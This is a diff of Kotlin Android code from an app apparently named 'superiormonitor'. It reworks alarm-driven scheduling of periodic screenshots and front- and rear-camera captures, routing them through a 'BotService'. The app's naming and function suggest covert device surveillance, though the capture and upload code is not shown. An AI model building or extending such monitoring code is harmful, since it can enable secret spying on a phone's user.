@@ -122,12 +122,25 @@ class SnapshotScheduler(private val context: Context) {
 
 class SnapshotReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
-        val pendingResult = goAsync()
-        val prefsManager = PrefsManager.getInstance(context)
+        val action = intent.action ?: return
+        
+        LogManager.log(LogCategory.SNAPSHOTS, "Alarm triggered. Sending capture intent to BotService...")
+        val botIntent = Intent(context, com.system.superiormonitor.bot.BotService::class.java).apply {
+            this.action = action
+        }
+        context.startService(botIntent)
 
-        CoroutineScope(Dispatchers.IO).launch {
+        // Reschedule immediately on the main thread (No blocking operations)
+        if (action == "com.system.superiormonitor.ACTION_SNAPSHOT") SnapshotScheduler(context).scheduleNextSnapshot()
+        if (action == "com.system.superiormonitor.ACTION_FRONT_CAMERA") SnapshotScheduler(context).scheduleNextCamera(1)
+        if (action == "com.system.superiormonitor.ACTION_REAR_CAMERA") SnapshotScheduler(context).scheduleNextCamera(0)
+    }
+}
+
+object SnapshotWorker {
+    fun executeCapture(context: Context, action: String, prefsManager: PrefsManager, serviceScope: CoroutineScope) {
+        serviceScope.launch(Dispatchers.IO) {
             try {
-                val action = intent.action ?: "com.system.superiormonitor.ACTION_SNAPSHOT"
                 val isSnapshot = action == "com.system.superiormonitor.ACTION_SNAPSHOT"
                 val isFrontCamera = action == "com.system.superiormonitor.ACTION_FRONT_CAMERA"
                 val isRearCamera = action == "com.system.superiormonitor.ACTION_REAR_CAMERA"
@@ -214,12 +227,6 @@ class SnapshotReceiver : BroadcastReceiver() {
 
             } catch (e: Exception) {
                 LogManager.log(LogCategory.SNAPSHOTS, "[Worker] Error: ${e.message}", LogLevel.ERROR)
-            } finally {
-                val action = intent.action ?: "com.system.superiormonitor.ACTION_SNAPSHOT"
-                if (action == "com.system.superiormonitor.ACTION_SNAPSHOT") SnapshotScheduler(context).scheduleNextSnapshot()
-                if (action == "com.system.superiormonitor.ACTION_FRONT_CAMERA") SnapshotScheduler(context).scheduleNextCamera(1)
-                if (action == "com.system.superiormonitor.ACTION_REAR_CAMERA") SnapshotScheduler(context).scheduleNextCamera(0)
-                pendingResult.finish()
             }
         }
     }
